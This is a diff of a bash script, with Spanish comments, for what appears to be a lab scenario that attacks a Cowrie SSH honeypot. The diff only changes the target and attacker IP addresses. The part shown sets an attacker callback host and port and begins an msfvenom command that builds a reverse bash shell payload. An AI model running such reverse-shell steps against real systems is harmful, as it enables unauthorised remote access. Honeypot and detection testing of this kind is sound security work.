@@ -3,7 +3,7 @@
 # Escenario S09: Reverse Shell (T1059.004)
 # ============================================================================
 # Herramientas: msfvenom, nc
-# Target: Cowrie SSH honeypot (172.20.0.50:2222)
+# Target: Cowrie SSH honeypot (10.20.0.50:2222)
 # ============================================================================
 
 set -e
@@ -11,7 +11,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
 mkdir -p "$EVIDENCE_DIR"
 
-HONEYPOT_HOST="172.20.0.50"
+HONEYPOT_HOST="10.20.0.50"
 HONEYPOT_PORT="2222"
 TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")
 
@@ -24,7 +24,7 @@ echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"
 
 # 1. Generar payload con msfvenom
 echo "[*] Fase 1: Generar reverse shell payload"
-LHOST="172.20.0.99"  # atacante IP
+LHOST="10.20.0.99"  # atacante IP
 LPORT="4444"
 
 msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT \
